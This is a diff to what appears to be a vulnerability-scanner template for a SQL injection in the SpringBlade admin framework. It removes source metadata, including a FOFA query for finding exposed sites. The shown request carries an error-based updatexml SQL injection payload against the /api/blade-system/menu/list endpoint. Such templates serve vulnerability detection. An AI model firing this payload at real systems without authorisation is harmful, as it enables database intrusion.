@@ -3,12 +3,8 @@ info:
   name: SpringBlade后台框架menulist存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/eyk6vlbox29ziola'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: eyk6vlbox29ziola
-    fofa: body="https://bladex.vip"
 http:
 - raw:
   - 'GET /api/blade-system/menu/list?updatexml(1,concat(0x7e,md5(1),0x7e),1)=1 HTTP/1.1
